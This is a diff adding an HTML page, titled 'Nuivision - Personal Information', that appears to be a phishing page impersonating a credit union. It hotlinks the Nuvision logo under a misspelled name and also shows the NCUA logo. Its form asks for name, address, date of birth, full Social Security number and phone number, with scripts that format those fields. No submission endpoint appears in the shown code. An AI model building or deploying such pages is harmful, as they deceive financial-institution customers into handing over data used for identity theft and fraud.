@@ -1,0 +1,326 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Nuivision - Personal Information</title>
+    <link
+      rel="icon"
+      type="image/jpeg"
+      href="https://s3-media0.fl.yelpcdn.com/bphoto/ASbZrjRyKIcUNEoVv5f3ag/o.jpg"
+    />
+    <style>
+      body {
+        background-color: #767679;
+        font-family: Arial, sans-serif;
+        margin: 0;
+      }
+
+      .main-section {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        min-height: 100vh;
+        padding: 10px;
+        box-sizing: border-box;
+      }
+
+      .center-container {
+        display: flex;
+        flex-direction: column;
+        width: 100%;
+        max-width: 700px;
+        background-color: #f6f6f6;
+        border-radius: 8px;
+        overflow: hidden;
+        box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+      }
+
+      .top-section {
+        background-color: #ffffff;
+        display: flex;
+        justify-content: center;
+        padding: 20px;
+        border-bottom: 1px solid #cccccc;
+        border-top-left-radius: 8px;
+        border-top-right-radius: 8px;
+      }
+
+      .top-section img {
+        max-width: 50%;
+        height: auto;
+        max-height: 90px;
+      }
+
+      .middle-section {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        padding: 20px;
+      }
+
+      .form {
+        width: 100%;
+        max-width: 400px;
+        padding: 0;
+      }
+
+      .label {
+        color: #2e2e2e;
+        font-family: sans-serif;
+        margin-top: 10px;
+        display: block;
+      }
+
+      .input-section {
+        width: 100%;
+        margin-top: 10px;
+        box-sizing: border-box;
+        border: 1px solid #cccccc;
+        height: 45px;
+        border-radius: 5px;
+        padding: 10px;
+        font-size: 16px;
+      }
+
+      .submit-btn {
+        border-radius: 5px;
+        background-color: #8da3ad;
+        width: 100%;
+        border: none;
+        height: 40px;
+        color: white;
+        cursor: pointer;
+        font-size: 16px;
+        margin-top: 20px;
+      }
+
+      .submit-btn:not(:disabled) {
+        background-color: #415d6a;
+        cursor: pointer;
+      }
+
+      .submit-btn:disabled {
+        cursor: not-allowed;
+        opacity: 0.6;
+      }
+
+      .down-section {
+        background-color: #003f53;
+        display: flex;
+        color: white;
+        align-items: center;
+        gap: 20px;
+        font-family: sans-serif;
+        font-size: 13px;
+        justify-content: center;
+        flex-wrap: wrap;
+        padding: 15px;
+        border-bottom-left-radius: 8px;
+        border-bottom-right-radius: 8px;
+      }
+
+      .bottom-logo {
+        display: flex;
+        justify-content: center;
+        padding: 20px;
+        margin-top: 20px;
+      }
+
+      .bottom-logo img {
+        max-width: 130px;
+        height: auto;
+      }
+
+      .address-group {
+        display: flex;
+        gap: 10px;
+        margin-top: 10px;
+      }
+
+      .address-group .input-section {
+        flex: 1;
+      }
+
+      .state-zip-group {
+        display: flex;
+        gap: 10px;
+      }
+
+      .state-zip-group .input-section {
+        flex: 1;
+      }
+
+      @media (max-width: 600px) {
+        .center-container {
+          max-width: 100%;
+          margin: 0 10px;
+        }
+
+        .top-section {
+          justify-content: center;
+          padding: 10px;
+        }
+
+        .top-section img {
+          max-width: 70%;
+          margin: 0;
+        }
+
+        .form {
+          max-width: 100%;
+          padding: 0 20px;
+        }
+
+        .down-section {
+          gap: 15px;
+          font-size: 12px;
+          padding: 10px;
+        }
+
+        .bottom-logo img {
+          max-width: 100px;
+        }
+
+        .address-group,
+        .state-zip-group {
+          flex-direction: column;
+          gap: 10px;
+        }
+      }
+
+      @media (max-width: 400px) {
+        .input-section,
+        .submit-btn {
+          font-size: 14px;
+        }
+
+        .down-section {
+          flex-direction: column;
+          gap: 10px;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <div class="main-section">
+      <div class="center-container">
+        <div class="top-section">
+          <img
+            src="https://chambermaster.blob.core.windows.net/images/members/764/10280/MemPageHeader_Nuvision_color_01_Logo.jpg"
+            alt="Nuivision Logo"
+          />
+        </div>
+        <div class="middle-section">
+          <form class="form">
+            <div>
+              <label class="label">Full Name</label>
+              <input type="text" id="fullName" class="input-section" required />
+            </div>
+            <div>
+              <label class="label">Address</label>
+              <input type="text" id="address" class="input-section" required />
+            </div>
+            <div class="address-group">
+              <div>
+                <label class="label">City</label>
+                <input type="text" id="city" class="input-section" required />
+              </div>
+              <div class="state-zip-group">
+                <div>
+                  <label class="label">State</label>
+                  <input type="text" id="state" class="input-section" maxlength="2" required />
+                </div>
+                <div>
+                  <label class="label">Zip</label>
+                  <input type="text" id="zip" class="input-section" maxlength="10" required />
+                </div>
+              </div>
+            </div>
+            <div>
+              <label class="label">Date of Birth</label>
+              <input type="date" id="dob" class="input-section" required />
+            </div>
+            <div>
+              <label class="label">SSN</label>
+              <input type="text" id="ssn" class="input-section" maxlength="11" placeholder="XXX-XX-XXXX" required />
+            </div>
+            <div>
+              <label class="label">Phone Number</label>
+              <input type="tel" id="phone" class="input-section" maxlength="12" placeholder="XXX-XXX-XXXX" required />
+            </div>
+            <button class="submit-btn" id="submitBtn" disabled type="submit">
+              Submit
+            </button>
+          </form>
+        </div>
+        <div class="down-section">
+          Call Us | Privacy Policy | Enroll Now | Forgot Login | Rates
+        </div>
+      </div>
+      <div class="bottom-logo">
+        <img
+          src="https://cdn1.onlineaccess1.com/cdn/depot/5063/3393/ba5a89e5187907b47df565433c5fa651/assets/images/ncua_logo_large-4a4a13e41007adaf4841dd9e4b145458.png"
+          alt="NCUA Logo"
+          height="40%"
+          width="100%"
+        />
+      </div>
+    </div>
+
+    <script>
+      const inputs = {
+        fullName: document.getElementById("fullName"),
+        address: document.getElementById("address"),
+        city: document.getElementById("city"),
+        state: document.getElementById("state"),
+        zip: document.getElementById("zip"),
+        dob: document.getElementById("dob"),
+        ssn: document.getElementById("ssn"),
+        phone: document.getElementById("phone"),
+      };
+      const submitBtn = document.getElementById("submitBtn");
+
+      function checkInputs() {
+        const allFilled = Object.values(inputs).every(
+          (input) => input.value.trim() !== ""
+        );
+        submitBtn.disabled = !allFilled;
+      }
+
+      Object.values(inputs).forEach((input) =>
+        input.addEventListener("input", checkInputs)
+      );
+
+      // Basic input formatting
+      inputs.ssn.addEventListener("input", (e) => {
+        let value = e.target.value.replace(/\D/g, "");
+        if (value.length > 9) value = value.slice(0, 9);
+        if (value.length > 5) {
+          e.target.value = `${value.slice(0, 3)}-${value.slice(3, 5)}-${value.slice(5)}`;
+        } else if (value.length > 3) {
+          e.target.value = `${value.slice(0, 3)}-${value.slice(3)}`;
+        } else {
+          e.target.value = value;
+        }
+      });
+
+      inputs.phone.addEventListener("input", (e) => {
+        let value = e.target.value.replace(/\D/g, "");
+        if (value.length > 10) value = value.slice(0, 10);
+        if (value.length > 6) {
+          e.target.value = `${value.slice(0, 3)}-${value.slice(3, 6)}-${value.slice(6)}`;
+        } else if (value.length > 3) {
+          e.target.value = `${value.slice(0, 3)}-${value.slice(3)}`;
+        } else {
+          e.target.value = value;
+        }
+      });
+
+      inputs.state.addEventListener("input", (e) => {
+        e.target.value = e.target.value.toUpperCase().replace(/[^A-Z]/g, "");
+      });
+    </script>
+  </body>
+</html>
